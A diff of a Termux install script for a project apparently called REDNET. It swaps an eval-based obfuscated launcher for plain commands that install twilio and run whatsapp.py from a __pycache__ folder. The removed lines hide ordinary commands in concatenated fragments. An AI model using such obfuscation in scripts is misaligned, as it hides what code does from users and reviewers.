@@ -1,3 +1,7 @@
-z="
-";Pz='ta/c';Zz='e__';Gz='inst';Kz='clea';Mz='cd  ';Cz='INST';cz='hats';az='pyth';Az='echo';Bz=' -e"';Dz='ALLI';bz='on w';Ez='NG"';Iz='twil';Oz='a/da';Lz='r';Xz='__py';ez='py';Hz='all ';Rz='ermu';Wz='NET/';dz='app.';Sz='x/fi';Uz='home';Jz='io';Vz='/RED';Tz='les/';Qz='om.t';Yz='cach';Nz='/dat';Fz='pip ';
-eval "$Az$Bz$Cz$Dz$Ez$z$Fz$Gz$Hz$Iz$Jz$z$Kz$Lz$z$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz$Yz$Zz$z$az$bz$cz$dz$ez"
+echo -e "installing"
+python3 -m venv venv
+source venv/bin/activate
+pip install --upgrade pip
+pip install twilio
+cd /data/data/com.termux/files/home/REDNET/__pycache__
+python whatsapp.py
